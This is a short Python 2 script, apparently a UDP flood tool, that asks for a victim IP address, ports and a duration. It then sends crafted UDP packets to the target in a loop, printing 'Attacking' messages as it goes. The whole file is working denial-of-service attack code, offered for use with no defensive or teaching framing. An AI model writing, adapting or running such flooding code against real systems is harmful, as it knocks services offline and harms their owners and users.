import time
import socket
import random
import struct

# import sys

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# creating packet header
packet = "qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
Size = int(raw_input('Please specify packet size.\n'))
length = 8 + len(packet)
checksum = 0
Tp = ""

##victim IP address
victim1 = raw_input('Target  IP > (Enter ip)')

##victim port number
vport = input('Port >')
sport = input('Port >')

# no. of seconds to flood on victim machine
duration = input('Time > (Seconds)')
udp_header = struct.pack('!HHHH', sport, vport, length, checksum)
timeout = time.time() + duration
sent = 0
adr = (victim1, vport)
# client.connect(adr)
while 1:
    if time.time() > timeout:
        break
    else:
        pass
    for Size in range(1, sent + 1000):
        try:

            Bytes = (Tp + packet)
            BytesEnc = str.encode(Bytes)
            ##lient.sendall(udp_header+BytesEnc)
            print "attack"
            client.sendto(udp_header + BytesEnc, (victim1, vport))
            sent = sent + Size
            ##client.sendall(udp_header+BytesEnc)
            print "Attacking %s sent packages %s at the port %s " % (sent, victim1, vport)
        except Exception as e:
            print "error", e

